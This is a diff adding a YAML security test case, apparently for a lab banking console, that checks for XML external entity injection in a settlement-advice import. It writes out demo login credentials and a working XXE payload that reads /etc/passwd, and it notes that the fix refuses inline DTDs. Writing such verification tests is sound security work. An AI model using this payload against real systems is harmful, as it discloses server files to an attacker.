@@ -1,0 +1,19 @@
+# LG-XXE-001 — XML external entity injection in the console settlement-advice import.
+# Config-gated by correspondent_advices (on under the permissive profile).
+preconditions:
+  - "a signed-on staff session (any real login)"
+  - "correspondent_advices=on (inline DTDs are honoured by the advice parser)"
+steps:
+  - call: "POST /login (console)"
+    body: "staff_id=TLR001&password=teller-pw (application/x-www-form-urlencoded)"
+    expect: "an lgsession cookie is set"
+  - call: "POST /import (console, with the session cookie)"
+    body: >
+      <?xml version="1.0"?><!DOCTYPE a [<!ENTITY x SYSTEM "file:///etc/passwd">]>
+      <advice><memo>&x;</memo></advice>
+    expect: "the response echoes memo= with the contents of /etc/passwd (contains a 'root:' line)"
+observable: >
+  With correspondent_advices=on the advice parser resolves the external SYSTEM entity, so the imported memo is
+  the contents of a local file the server can read (/etc/passwd, identifiable by a 'root:' line),
+  echoed back in the confirmation. With the fix (inline DTDs rejected) the import is refused with 400
+  and no file content is disclosed. Exploitable only when correspondent_advices=on.
